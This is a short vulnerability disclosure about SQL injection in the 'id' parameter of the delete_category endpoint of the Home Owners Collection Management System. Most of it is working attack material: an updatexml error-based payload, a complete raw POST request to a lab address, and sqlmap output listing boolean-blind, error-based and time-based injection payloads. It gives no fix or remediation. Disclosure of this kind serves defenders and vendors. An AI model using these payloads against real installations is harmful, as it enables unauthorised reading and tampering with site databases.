## Home Owners Collection Management System has SQL injection vulnerability

vendor : https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html

Vulnerability file: /hocms/classes/Master.php?f=delete_category

Vulnerability location: /hocms/classes/Master.php?f=delete_category,id

[+]Payload: id=3' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point

```
POST /hocms/classes/Master.php?f=delete_category HTTP/1.1
Host: 192.168.1.19
Content-Length: 64
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/hocms/admin/?page=categories
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=vfe306mj2a11p5q94440ttg4bd
Connection: close

id=3' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point
```
![image](https://user-images.githubusercontent.com/54017627/160325495-d386bef3-7e39-4f31-a3d4-c75d7a3d6c5e.png)


```sql
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=3' RLIKE (SELECT (CASE WHEN (4649=4649) THEN 3 ELSE 0x28 END))-- eYdq

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=3' AND (SELECT 5617 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT (ELT(5617=5617,1))),0x7176787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uiWU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=3' AND (SELECT 5049 FROM (SELECT(SLEEP(5)))lFmV)-- BDJM
---
```

![image](https://user-images.githubusercontent.com/54017627/160325574-e69e7663-bf77-47d3-971a-ffdf6e0fad60.png)
